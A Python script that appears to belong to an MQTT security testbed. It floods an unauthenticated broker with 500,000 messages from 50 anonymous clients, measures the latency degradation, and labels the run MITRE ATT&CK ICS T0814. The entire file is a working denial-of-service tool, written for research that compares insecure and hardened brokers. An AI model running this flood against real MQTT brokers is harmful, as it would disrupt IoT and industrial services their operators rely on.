#!/usr/bin/env python3
"""
03_dos.py - DoS Attack (INSECURE environment)

50 clients connect anonymously and publish 10000 messages each concurrently.
No authentication, no rate limiting, no TLS overhead.

Expected: broker CPU saturated, latency spikes dramatically.
MITRE ATT&CK ICS: T0814 Denial of Service
"""

import paho.mqtt.client as mqtt
import threading
import time
import json
import os
from datetime import datetime, timezone

BROKER_HOST       = os.getenv("BROKER_HOST", "172.20.0.20")
BROKER_PORT       = int(os.getenv("BROKER_PORT", 1883))
FLOOD_CONNECTIONS = 50
MSGS_PER_CLIENT   = 10000
FLOOD_TOPIC       = "attack/dos/flood"
LATENCY_TOPIC     = "metrics/dos/latency"
OUTPUT_DIR        = "/attacker/results"

latency_samples = []
messages_sent   = [0]
lock            = threading.Lock()
monitor_running = threading.Event()
monitor_running.set()
current_phase   = ["baseline"]


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def latency_monitor():
    received  = threading.Event()
    send_time = [0.0]

    def on_connect(c, u, f, rc, p):
        if rc == 0:
            c.subscribe(LATENCY_TOPIC, qos=0)

    def on_message(c, u, msg):
        lat = round((time.time() - send_time[0]) * 1000, 2)
        latency_samples.append({"ts": datetime.now().isoformat(),
                                 "ms": lat, "phase": current_phase[0]})
        received.set()

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="dos_monitor")
    client.on_connect = on_connect
    client.on_message = on_message
    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()
        time.sleep(0.5)
        while monitor_running.is_set():
            received.clear()
            send_time[0] = time.time()
            client.publish(LATENCY_TOPIC, "probe", qos=0)
            if not received.wait(timeout=3.0):
                # Timeout — broker non risponde
                latency_samples.append({"ts": datetime.now().isoformat(),
                                         "ms": 3000, "phase": current_phase[0]})
            time.sleep(0.5)
        client.loop_stop()
        client.disconnect()
    except Exception as e:
        log(f"[!] Monitor error: {e}")


def flood_worker(worker_id):
    try:
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                             client_id=f"flood_{worker_id}")
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()
        for i in range(MSGS_PER_CLIENT):
            client.publish(FLOOD_TOPIC,
                json.dumps({"w": worker_id, "i": i}), qos=0)
            if i % 100 == 0:
                with lock:
                    messages_sent[0] += 100
        client.loop_stop()
        client.disconnect()
    except Exception as e:
        log(f"[-] Worker {worker_id} error: {e}")


def stats(phase):
    s = [x["ms"] for x in latency_samples if x["phase"] == phase]
    if not s:
        return {"count": 0, "avg": "N/A", "min": "N/A", "max": "N/A"}
    return {"count": len(s), "avg": round(sum(s)/len(s), 2),
            "min": round(min(s), 2), "max": round(max(s), 2)}


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    output_file = f"{OUTPUT_DIR}/03_dos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    print("==============================================")
    print(" SCENARIO 3 - DoS Attack (INSECURE)")
    print("==============================================")
    print(f" Broker         : {BROKER_HOST}:{BROKER_PORT}")
    print(f" Flood clients  : {FLOOD_CONNECTIONS}")
    print(f" Msgs/client    : {MSGS_PER_CLIENT}")
    print(f" Total messages : {FLOOD_CONNECTIONS * MSGS_PER_CLIENT}")
    print(f" Auth required  : NO — anonymous access")
    print(f" TLS            : NO")
    print(f" Expected       : Broker saturated — latency spikes")
    print("==============================================\n")

    t_mon = threading.Thread(target=latency_monitor, daemon=True)
    t_mon.start()

    # Baseline
    log("[*] Collecting baseline latency (10s)...")
    time.sleep(10)
    bs = stats("baseline")
    log(f"[+] Baseline: avg={bs['avg']}ms  max={bs['max']}ms  samples={bs['count']}\n")

    # Flood
    log(f"[*] Launching flood: {FLOOD_CONNECTIONS} clients x {MSGS_PER_CLIENT} messages...")
    current_phase[0] = "flood"
    threads = [threading.Thread(target=flood_worker, args=(i,))
               for i in range(FLOOD_CONNECTIONS)]
    for t in threads:
        t.start()

    while any(t.is_alive() for t in threads):
        alive = sum(1 for t in threads if t.is_alive())
        s = stats("flood")
        log(f"[~] Active: {alive}/{FLOOD_CONNECTIONS} | "
            f"Msgs sent: {messages_sent[0]} | "
            f"Latency avg={s.get('avg','N/A')}ms max={s.get('max','N/A')}ms")
        time.sleep(2)

    for t in threads:
        t.join()

    fs = stats("flood")
    log(f"[+] Flood complete: avg={fs['avg']}ms  max={fs['max']}ms  samples={fs['count']}\n")

    # Recovery
    current_phase[0] = "recovery"
    time.sleep(5)
    monitor_running.clear()
    time.sleep(1)
    rs = stats("recovery")
    log(f"[+] Recovery: avg={rs['avg']}ms  max={rs['max']}ms\n")

    d = round((fs["avg"] - bs["avg"]) / bs["avg"] * 100, 1) if isinstance(fs["avg"], float) and isinstance(bs["avg"], float) and bs["avg"] > 0 else "N/A"

    results = {
        "environment":       "insecure",
        "broker":            f"{BROKER_HOST}:{BROKER_PORT}",
        "flood_clients":     FLOOD_CONNECTIONS,
        "msgs_per_client":   MSGS_PER_CLIENT,
        "latency_baseline":  bs,
        "latency_flood":     fs,
        "latency_recovery":  rs,
        "degradation_pct":   d,
        "messages_sent":     messages_sent[0],
        "auth_required":     False,
        "tls":               False,
        "all_samples":       latency_samples,
    }
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    print("==============================================")
    print(" ATTACK SUMMARY - Scenario 3 (INSECURE)")
    print("==============================================")
    print(f" Baseline latency : avg={bs['avg']}ms  max={bs['max']}ms")
    print(f" Flood latency    : avg={fs['avg']}ms  max={fs['max']}ms")
    print(f" Recovery latency : avg={rs['avg']}ms")
    print(f" Degradation      : {'+' if isinstance(d, float) and d > 0 else ''}{d}%")
    print(f" Messages sent    : {messages_sent[0]}")
    print(f" Result           : ATTACK SUCCEEDED — broker saturated")
    print(f" Output           : {output_file}")
    print("==============================================")


if __name__ == "__main__":
    main()
